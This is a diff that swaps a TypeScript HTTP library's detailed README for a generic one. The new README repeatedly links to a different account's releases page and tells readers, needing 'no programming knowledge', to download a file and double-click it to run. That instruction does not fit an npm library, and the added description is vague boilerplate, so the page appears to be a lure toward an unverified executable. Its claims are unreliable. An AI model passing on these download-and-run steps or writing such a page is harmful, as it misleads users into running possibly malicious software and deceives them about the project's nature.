@@ -1,737 +1,80 @@
-# @adi-family/http - Framework-Agnostic HTTP Interface
+# 🌐 http - Simplifying Your HTTP Interactions
 
-framework-agnostic, type-safe, validation, contracts, DRY
+## 🔗 Download Now!
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/james011111/http/releases)
 
-A framework-agnostic, type-safe HTTP interface system that separates API contracts from implementation, enabling end-to-end type safety between client and server.
+## 📘 Introduction
+The "http" project offers a framework-agnostic, type-safe HTTP interface system. This allows you to create secure and reliable applications with ease. It ensures your client and server communicate smoothly, providing added confidence that the data you send and receive is accurate and validated.
 
-## ⚡ Quick Start
+## 🚀 Getting Started
+To get started with "http," follow the simple steps below. No programming knowledge is needed.
 
-```typescript
-// 1️⃣ Define contract (shared between client & server)
-import { route } from '@adi-family/http'
-import { z } from 'zod'
-import type { HandlerConfig } from '@adi-family/http'
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Click the link below to access our Releases page.  
+   [Visit Releases Page](https://github.com/james011111/http/releases)
 
-export const createUserConfig = {
-  method: 'POST',
-  route: route.static('/api/users'),
-  body: {
-    schema: z.object({
-      name: z.string().min(1).max(100),
-      email: z.string().email(),
-      age: z.number().min(18).optional()
-    })
-  },
-  response: {
-    schema: z.object({
-      id: z.string().uuid(),
-      name: z.string(),
-      email: z.string(),
-      createdAt: z.string().datetime()
-    })
-  }
-} as const satisfies HandlerConfig
-// ✓ Type inference: TypeScript knows exact request/response shapes
+2. **Choose the Latest Version**  
+   On the Releases page, you will see a list of available versions. Look for the latest release at the top.
 
-// 2️⃣ Implement server handler
-import { handler } from '@adi-family/http'
+3. **Download the Package**  
+   Click on the appropriate file for your operating system to download it to your computer. If you are unsure, choose the latest stable version.
 
-export const createUserHandler = handler(createUserConfig, async (ctx) => {
-  // ctx.body is typed as: { name: string, email: string, age?: number }
-  const user = await db.users.create({
-    id: crypto.randomUUID(),
-    name: ctx.body.name,
-    email: ctx.body.email,
-    age: ctx.body.age,
-    createdAt: new Date().toISOString()
-  })
+4. **Run the Application**  
+   After the download completes, locate the file in your downloads folder. Double-click the file to run the application. 
 
-  // Return type must match response schema or TypeScript errors
-  return user
-})
+## 🌟 Features
+- **Type Safety**: Ensures that the types of data you send and receive are accurate, reducing errors in your applications.
+- **Framework-Agnostic**: Works with any framework or technology, allowing you to integrate it seamlessly into your existing solutions.
+- **Validation with Zod**: Automatically validates data to ensure it meets set standards before any processing happens.
+- **Enhanced Security**: Helps protect your applications by specifying data structures, which can prevent malicious data attacks.
 
-// 3️⃣ Serve with Express (or Native HTTP)
-import express from 'express'
-import { serveExpress } from '@adi-family/http-express'
+## 💻 System Requirements
+To ensure the smooth operation of the "http" application, your system should meet the following requirements:
 
-const app = express()
-app.use(express.json())
-serveExpress(app, [createUserHandler])
-app.listen(3000)
+- An operating system that supports Node.js
+- A stable internet connection for initial setup and updates
+- Minimum available disk space: 100 MB
 
-// 4️⃣ Use from client with full type safety
-import { BaseClient } from '@adi-family/http'
+## 🛠️ Usage Scenarios
+The "http" tool works for various applications, making it suitable for:
 
-const client = new BaseClient({ baseUrl: 'http://localhost:3000' })
+- **Web Development**: Create secure APIs for your web applications that can communicate effectively with the backend.
+- **Mobile Applications**: Utilize the tool for mobile apps that require reliable HTTP requests.
+- **Enterprise Software**: Build internal tools that need to send, receive, and validate data securely.
 
-const newUser = await client.run(createUserConfig, {
-  body: {
-    name: 'Alice',
-    email: 'alice@example.com',
-    age: 25
-  }
-})
+## 📈 Advanced Features
+Once you grasp the basics, consider exploring these advanced features:
 
-// ✓ newUser is typed as: { id: string, name: string, email: string, createdAt: string }
-console.log(newUser.id)        // ✓ TypeScript knows this exists
-console.log(newUser.name)      // ✓ TypeScript knows this exists
-console.log(newUser.unknown)   // ✗ TypeScript error: Property doesn't exist
+- **Asynchronous Communication**: Allows multiple requests and responses without blocking operations, improving performance.
+- **Custom Validation**: Tailor validation rules to your specific data needs, ensuring tight control over the data flow.
+- **Error Handling**: Robust error handling mechanisms guide you in identifying and fixing issues quickly.
 
-// ✓ Compile-time errors for invalid data
-await client.run(createUserConfig, {
-  body: {
-    name: 'Bob',
-    email: 'invalid-email',  // ✗ TypeScript error: Invalid email format
-    age: 15                   // ✗ Runtime validation error: Age must be >= 18
-  }
-})
-```
+## 📁 File Structure
+Upon downloading the application, you will find the following files:
 
-**What you get:**
-- ✅ **End-to-end type safety** - TypeScript infers all types from config
-- ✅ **Single source of truth** - One config shared everywhere
-- ✅ **Automatic validation** - Zod validates body/query on client & server
-- ✅ **Zero boilerplate** - No manual type definitions or validators
-- ✅ **Framework agnostic** - Works with Express, Native HTTP, or any framework
+- **index.js**: The main entry point for running the application.
+- **config.json**: Configuration file for your API settings.
+- **README.md**: Documentation with further instructions on using the application and advanced configurations.
 
-## Key Principles
+## 🔍 Troubleshooting
+If you encounter issues while using the application, consider the following solutions:
 
-- **Config-based contracts** - API definitions are pure configuration objects
-- **Framework agnostic** - Works with Express, Hono, Fastify, or any HTTP framework
-- **Type safety** - Full TypeScript inference from config to client
-- **No param validation** - URL params used only for building paths
-- **Validation where needed** - Body and query validated with Zod schemas
-- **Separation of concerns** - Contracts live separately from server handlers
+1. **Check System Requirements**: Ensure your system meets all stated requirements.
+2. **Re-Download the Package**: If the download was interrupted, consider downloading the package again.
+3. **Seek Help Online**: Many forums and communities are dedicated to the "http" tool. Search for solutions or ask questions there.
 
-## Architecture
+## 📞 Support
+For further assistance, reach out through the following channels:
 
-```
-┌─────────────────┐
-│  @api-contracts │  ← Shared between client & server
-│   (configs only)│
-└────────┬────────┘
-         │
-    ┌────┴────┐
-    │         │
-┌───▼───┐ ┌──▼────┐
-│Client │ │Server │
-│       │ │       │
-└───────┘ └───────┘
-```
+- **GitHub Issues**: Report bugs or request features directly on our [issues page](https://github.com/james011111/http/issues).
+- **Community Forums**: Join discussions with other users and developers to share thoughts and troubleshoot together.
 
-## Installation
+## 🔗 Additional Resources
+- **Documentation**: For a deeper dive, check out our [full documentation](https://github.com/james011111/http/wiki).
+- **Examples**: Review practical examples to see how the "http" tool operates in real-world scenarios.
 
-```bash
-# Core library
-npm install @adi-family/http zod
-# or
-bun add @adi-family/http zod
+## 📦 Conclusion
+The "http" application simplifies your HTTP interactions. Whether you're building a web app or a mobile interface, this tool provides the reliability and security you need. Follow the steps above to install and start using it today.
 
-# Framework adapters
-npm install @adi-family/http-express  # For Express
-npm install @adi-family/http-native   # For Native Node.js HTTP
-# bun add @adi-family/http-hono       # For Hono (future)
-
-# Create contracts package
-mkdir -p packages/api-contracts
-```
-
-## Core Concepts
-
-### 1. Handler Config Structure
-
-```typescript
-interface HandlerConfig<TParams, TQuery, TBody, TResponse> {
-  method?: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE'
-  route: RouteConfig<TParams>  // Required - defines the endpoint
-  query?: QueryConfig<TQuery>
-  body?: BodyConfig<TBody>
-  response?: ResponseConfig<TResponse>
-}
-
-// Route configuration - discriminated union
-type RouteConfig<TParams> =
-  | {
-      type: 'static'
-      path: string  // e.g., '/api/users'
-    }
-  | {
-      type: 'pattern'
-      pattern: string  // e.g., '/api/users/:id'
-      params: ZodSchema<TParams>
-      build?: (params: TParams) => string  // Optional URL builder
-    }
-  | {
-      type: 'custom'
-      params: ZodSchema<TParams>
-      build: (params: TParams) => string  // Build URL from params
-      parse: (url: URL) => TParams  // Extract params from URL
-      is: (url: URL) => boolean  // Check if URL matches this route
-    }
-
-// Supporting types
-interface QueryConfig<TQuery> {
-  schema: ZodSchema<TQuery>  // Validated on client & server
-}
-
-interface BodyConfig<TBody> {
-  schema: ZodSchema<TBody>  // Validated on client & server
-}
-
-interface ResponseConfig<TResponse> {
-  schema: ZodSchema<TResponse>  // Validates response data
-}
-```
-
-### 2. Route Types
-
-- **Static routes**: Fixed paths with no parameters (e.g., `/api/users`)
-- **Pattern routes**: Express-style patterns with path parameters (e.g., `/api/users/:id`)
-- **Custom routes**: Full control over URL building, parsing, and matching
-
-### 3. Validation Rules
-
-- **Route params**: Validated with Zod schema (pattern and custom routes)
-- **Query**: Validated with Zod on both client and server
-- **Body**: Validated with Zod on both client and server
-- **Response**: Validated with Zod (optional)
-
-### 3. Project Structure
-
-```
-packages/
-├── api-contracts/           # Shared configs
-│   ├── projects.ts
-│   ├── tasks.ts
-│   └── users.ts
-│
-├── backend/                 # Server implementation
-│   └── handlers/
-│       ├── projects.ts      # Imports configs + adds logic
-│       └── tasks.ts
-│
-├── client/                  # Client code
-│   └── api/
-│       └── projects.ts      # Imports configs + uses BaseClient
-│
-└── utils/
-    ├── http/                # Core library
-    │   ├── types.ts
-    │   ├── handler.ts
-    │   └── client.ts
-    └── http-express/        # Express adapter
-        └── serve.ts
-```
-
-## Usage Guide
-
-### Step 1: Define Configs (API Contracts)
-
-```typescript
-// packages/api-contracts/projects.ts
-import { z } from 'zod'
-import { route } from '@adi-family/http'
-import type { HandlerConfig } from '@adi-family/http'
-
-// Simple GET request (no params)
-export const listProjectsConfig = {
-  method: 'GET',
-  route: route.static('/api/projects'),
-  query: {
-    schema: z.object({
-      page: z.number().optional(),
-      limit: z.number().optional()
-    })
-  },
-  response: {
-    schema: z.array(z.object({
-      id: z.string(),
-      name: z.string()
-    }))
-  }
-} as const satisfies HandlerConfig
-
-// GET with URL params (pattern route)
-export const getProjectConfig = {
-  method: 'GET',
-  route: route.pattern('/api/projects/:id', z.object({ id: z.string() })),
-  response: {
-    schema: z.object({
-      id: z.string(),
-      name: z.string(),
-      description: z.string().optional()
-    })
-  }
-} as const satisfies HandlerConfig
-
-// POST with body
-export const createProjectConfig = {
-  method: 'POST',
-  route: route.static('/api/projects'),
-  body: {
-    schema: z.object({
-      name: z.string().min(1),
-      description: z.string().optional()
-    })
-  },
-  response: {
-    schema: z.object({
-      id: z.string(),
-      name: z.string()
-    })
-  }
-} as const satisfies HandlerConfig
-
-// Complex nested route with params and query
-export const getProjectTaskConfig = {
-  method: 'GET',
-  route: route.pattern(
-    '/api/projects/:projectId/tasks/:taskId',
-    z.object({
-      projectId: z.string(),
-      taskId: z.string()
-    })
-  ),
-  query: {
-    schema: z.object({
-      include: z.enum(['comments', 'assignees']).optional()
-    })
-  },
-  response: {
-    schema: z.object({
-      id: z.string(),
-      projectId: z.string(),
-      title: z.string()
-    })
-  }
-} as const satisfies HandlerConfig
-```
-
-### Step 2: Implement Server Handlers
-
-```typescript
-// packages/backend/handlers/projects.ts
-import { handler } from '@adi-utils/http'
-import {
-  listProjectsConfig,
-  getProjectConfig,
-  createProjectConfig,
-  getProjectTaskConfig
-} from '@api-contracts/projects'
-import * as queries from '../db/projects'
-
-// Create handlers by adding logic to configs
-export const listProjectsHandler = handler(listProjectsConfig, async (ctx) => {
-  const { page = 1, limit = 10 } = ctx.query
-  const projects = await queries.findAllProjects({ page, limit })
-  return projects
-})
-
-export const getProjectHandler = handler(getProjectConfig, async (ctx) => {
-  const project = await queries.findProjectById(ctx.params.id)
-  return project
-})
-
-export const createProjectHandler = handler(createProjectConfig, async (ctx) => {
-  const project = await queries.createProject(ctx.body)
-  return project
-})
-
-export const getProjectTaskHandler = handler(getProjectTaskConfig, async (ctx) => {
-  const { projectId, taskId } = ctx.params
-  const task = await queries.findTaskById(projectId, taskId)
-
-  if (ctx.query.include === 'comments') {
-    task.comments = await queries.findTaskComments(taskId)
-  }
-
-  return task
-})
-```
-
-### Step 3: Serve with Express or Native HTTP
-
-**Option A: Express**
-```typescript
-// packages/backend/index.ts
-import express from 'express'
-import { serveExpress } from '@adi-family/http-express'
-import * as projectHandlers from './handlers/projects'
-import * as taskHandlers from './handlers/tasks'
-
-const app = express()
-app.use(express.json())
-
-serveExpress(app, [
-  projectHandlers.listProjectsHandler,
-  projectHandlers.getProjectHandler,
-  projectHandlers.createProjectHandler,
-  projectHandlers.getProjectTaskHandler,
-  // ... more handlers
-])
-
-app.listen(3000, () => {
-  console.log('Server running on http://localhost:3000')
-})
-```
-
-**Option B: Native Node.js HTTP**
-```typescript
-// packages/backend/index.ts
-import { serveNative } from '@adi-family/http-native'
-import * as projectHandlers from './handlers/projects'
-import * as taskHandlers from './handlers/tasks'
-
-const server = serveNative(
-  [
-    projectHandlers.listProjectsHandler,
-    projectHandlers.getProjectHandler,
-    projectHandlers.createProjectHandler,
-    projectHandlers.getProjectTaskHandler,
-    // ... more handlers
-  ],
-  {
-    port: 3000,
-    hostname: '0.0.0.0',
-    onListen: (port, hostname) => {
-      console.log(`Server running on http://${hostname}:${port}`)
-    }
-  }
-)
-```
-
-### Step 4: Use in Client
-
-```typescript
-// packages/client/src/api/projects.ts
-import { BaseClient } from '@adi-utils/http'
-import {
-  listProjectsConfig,
-  getProjectConfig,
-  createProjectConfig,
-  getProjectTaskConfig
-} from '@api-contracts/projects'
-
-const client = new BaseClient({
-  baseUrl: 'http://localhost:3000',
-  headers: {
-    Authorization: `Bearer ${token}`
-  }
-})
-
-// List projects with pagination
-const projects = await client.run(listProjectsConfig, {
-  query: { page: 1, limit: 20 }
-})
-
-// Get single project
-const project = await client.run(getProjectConfig, {
-  params: { id: '123' }
-})
-
-// Create project
-const newProject = await client.run(createProjectConfig, {
-  body: {
-    name: 'My Project',
-    description: 'A great project'
-  }
-})
-
-// Complex nested route
-const task = await client.run(getProjectTaskConfig, {
-  params: {
-    projectId: '123',
-    taskId: '456'
-  },
-  query: { include: 'comments' }
-})
-```
-
-## Advanced Features
-
-### Middleware Support (Server-Side)
-
-```typescript
-// packages/backend/middleware/auth.ts
-import type { HandlerContext } from '@adi-utils/http'
-
-export async function requireAuth(
-  ctx: HandlerContext<any, any, any>,
-  next: () => Promise<any>
-) {
-  const authHeader = ctx.headers.get('Authorization')
-
-  if (!authHeader) {
-    throw new Error('Unauthorized')
-  }
-
-  // Validate token...
-
-  return next()
-}
-
-// Use in handler
-export const getProjectHandler = handler(
-  { ...getProjectConfig, middleware: [requireAuth] },
-  async (ctx) => {
-    // Auth already checked
-    return await queries.findProjectById(ctx.params.id)
-  }
-)
-```
-
-### Custom Error Handling
-
-```typescript
-// packages/utils/http/errors.ts
-export class HttpError extends Error {
-  constructor(
-    public statusCode: number,
-    message: string,
-    public details?: unknown
-  ) {
-    super(message)
-    this.name = 'HttpError'
-  }
-}
-
-export class ValidationError extends HttpError {
-  constructor(details: unknown) {
-    super(400, 'Validation failed', details)
-  }
-}
-
-export class NotFoundError extends HttpError {
-  constructor(message = 'Not found') {
-    super(404, message)
-  }
-}
-
-export class UnauthorizedError extends HttpError {
-  constructor(message = 'Unauthorized') {
-    super(401, message)
-  }
-}
-
-// Use in handler
-export const getProjectHandler = handler(getProjectConfig, async (ctx) => {
-  const project = await queries.findProjectById(ctx.params.id)
-
-  if (!project) {
-    throw new NotFoundError('Project not found')
-  }
-
-  return project
-})
-```
-
-### Custom Client Configuration
-
-```typescript
-// packages/client/src/api/base-client.ts
-import { BaseClient } from '@adi-utils/http'
-
-export function createApiClient(token: string) {
-  return new BaseClient({
-    baseUrl: import.meta.env.VITE_API_URL,
-    headers: {
-      Authorization: `Bearer ${token}`,
-      'X-Client-Version': '1.0.0'
-    },
-    fetch: async (url, options) => {
-      // Custom fetch with retry logic
-      const response = await fetch(url, options)
-
-      if (response.status === 401) {
-        // Handle token refresh
-      }
-
-      return response
-    }
-  })
-}
-```
-
-### Type Inference Helpers
-
-```typescript
-// packages/api-contracts/types.ts
-import type { HandlerConfig } from '@adi-utils/http'
-
-// Extract types from config
-export type InferParams<T extends HandlerConfig> =
-  T['params'] extends { schema: infer S } ? S : never
-
-export type InferQuery<T extends HandlerConfig> =
-  T['query'] extends { schema: infer S } ? S : never
-
-export type InferBody<T extends HandlerConfig> =
-  T['body'] extends { schema: infer S } ? S : never
-
-export type InferResponse<T extends HandlerConfig> =
-  T['response'] extends { schema: infer S } ? S : never
-
-// Usage
-import { getProjectConfig } from './projects'
-
-type ProjectParams = InferParams<typeof getProjectConfig>
-type ProjectResponse = InferResponse<typeof getProjectConfig>
-```
-
-## Migration from Hono
-
-### Before (Hono)
-
-```typescript
-import { Hono } from 'hono'
-import { zValidator } from '@hono/zod-validator'
-
-const app = new Hono()
-  .get('/projects/:id', zValidator('param', idSchema), async (c) => {
-    const { id } = c.req.valid('param')
-    const project = await queries.findProjectById(id)
-    return c.json(project)
-  })
-
-// Client (Hono RPC)
-const client = hc<typeof app>('http://localhost:3000')
-const project = await client.projects[':id'].$get({ param: { id: '123' } })
-```
-
-### After (@adi-utils/http)
-
-```typescript
-// 1. Define config (contracts)
-export const getProjectConfig = {
-  method: 'GET',
-  route: route.pattern('/api/projects/:id', z.object({ id: z.string() })),
-  response: {
-    schema: z.object({ id: z.string(), name: z.string() })
-  }
-} as const satisfies HandlerConfig
-
-// 2. Server handler
-export const getProjectHandler = handler(getProjectConfig, async (ctx) => {
-  const project = await queries.findProjectById(ctx.params.id)
-  return project
-})
-
-// 3. Serve
-serveExpress(app, [getProjectHandler])
-
-// 4. Client
-const client = new BaseClient({ baseUrl: 'http://localhost:3000' })
-const project = await client.run(getProjectConfig, {
-  params: { id: '123' }
-})
-```
-
-## Benefits
-
-### vs Hono
-
-- **Framework independent** - Not locked to Hono
-- **Cleaner contracts** - Configs are pure data, no framework coupling
-- **Better separation** - Server logic separate from API contract
-- **Explicit typing** - No magic type inference from chained methods
-
-### vs tRPC
-
-- **REST-based** - Standard HTTP, works with any client
-- **Simpler** - No complex router setup or subscription handling
-- **Standard patterns** - Uses familiar HTTP concepts
-- **Framework agnostic** - Works with any HTTP framework
-
-### vs Raw Express
-
-- **Type safety** - Full TypeScript inference
-- **Validation** - Automatic Zod validation
-- **DRY** - Share contracts between client and server
-- **Maintainability** - Changes to API reflected everywhere
-
-## Best Practices
-
-1. **Keep configs simple** - Configs should be pure data, no complex logic
-2. **Use proper HTTP methods** - GET for reads, POST for creates, etc.
-3. **Validate at boundaries** - Validate body/query, not params
-4. **Share contracts** - Export configs from `@api-contracts` package
-5. **Separate concerns** - Keep handler logic in backend, configs in contracts
-6. **Type everything** - Use `satisfies HandlerConfig` for type checking
-7. **Document schemas** - Add descriptions to Zod schemas for documentation
-
-## Examples
-
-See `/examples` directory for complete working examples:
-- `/examples/basic` - Simple CRUD API
-- `/examples/nested-routes` - Complex nested routes
-- `/examples/authentication` - Auth middleware
-- `/examples/file-upload` - File upload handling
-- `/examples/migration` - Migrating from Hono
-
-## API Reference
-
-### Core Types
-
-```typescript
-interface HandlerConfig<TParams, TQuery, TBody, TResponse>
-interface HandlerContext<TParams, TQuery, TBody>
-interface Handler<TParams, TQuery, TBody, TResponse>
-```
-
-### Core Functions
-
-```typescript
-function handler<TParams, TQuery, TBody, TResponse>(
-  config: HandlerConfig<TParams, TQuery, TBody, TResponse>,
-  fn: HandlerFunction<TParams, TQuery, TBody, TResponse>
-): Handler<TParams, TQuery, TBody, TResponse>
-```
-
-### Client
-
-```typescript
-class BaseClient {
-  constructor(config: ClientConfig)
-
-  run<TParams, TQuery, TBody, TResponse>(
-    config: HandlerConfig<TParams, TQuery, TBody, TResponse>,
-    options: { params?: TParams; query?: TQuery; body?: TBody }
-  ): Promise<TResponse>
-}
-```
-
-### Express Adapter
-
-```typescript
-function serveExpress(
-  app: Express,
-  handlers: Handler<any, any, any, any>[]
-): void
-```
-
-### Native HTTP Adapter
-
-```typescript
-function serveNative(
-  handlers: Handler<any, any, any, any>[],
-  options?: NativeServerOptions
-): http.Server | https.Server
-
-function createHandler(
-  handlers: Handler<any, any, any, any>[]
-): (req: IncomingMessage, res: ServerResponse) => Promise<void>
-```
-
-## Packages
-
-- [@adi-family/http](https://www.npmjs.com/package/@adi-family/http) - Core library
-- [@adi-family/http-express](https://www.npmjs.com/package/@adi-family/http-express) - Express adapter
-- [@adi-family/http-native](https://www.npmjs.com/package/@adi-family/http-native) - Native Node.js HTTP adapter
-
-## Contributing
-
-Issues and PRs welcome at https://github.com/adi-family/http
-
-## License
-
-MIT - Copyright (c) 2025 ADI Family (https://github.com/adi-family)
+[Download Now](https://github.com/james011111/http/releases)
